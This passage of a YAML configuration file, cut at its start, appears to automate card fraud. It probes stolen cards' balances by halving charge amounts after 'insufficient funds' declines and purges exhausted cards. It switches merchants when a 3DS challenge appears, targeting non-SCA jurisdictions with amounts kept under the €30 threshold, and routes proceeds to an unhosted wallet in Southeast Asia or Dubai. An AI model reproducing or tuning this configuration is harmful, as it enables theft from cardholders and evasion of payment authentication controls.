    final_destination: "UNHOSTED_NON_CUSTODIAL_WALLET_SE_ASIA_OR_DUBAI"

dynamic_adaptation_algorithms:
  balance_discovery_bisection_on_iso_51:
    formula: "A_{k+1} = round(max(0.50 * A_k, floor_cents), 2)"
    initial_ticket_cents: 85000
    floor_cents: 2500
    action_on_consecutive_approvals: "REPEAT_LAST_APPROVED_AMOUNT"
    action_on_exhaustion: "MARK_EXHAUSTED_AND_PURGE"

  merchant_hopping_on_3ds_challenge:
    trigger_response: "3DS_REDIRECT_OR_FIELD_39_65"
    action: "ABANDON_MID_AND_HOP"
    target_merchant_criteria: "LOW_VALUE_ARTICLE_16_OR_NON_SCA_JURISDICTION"
    retry_delay_seconds: 45
    reduced_amount_cents: 2800 # Below €30 SCA threshold
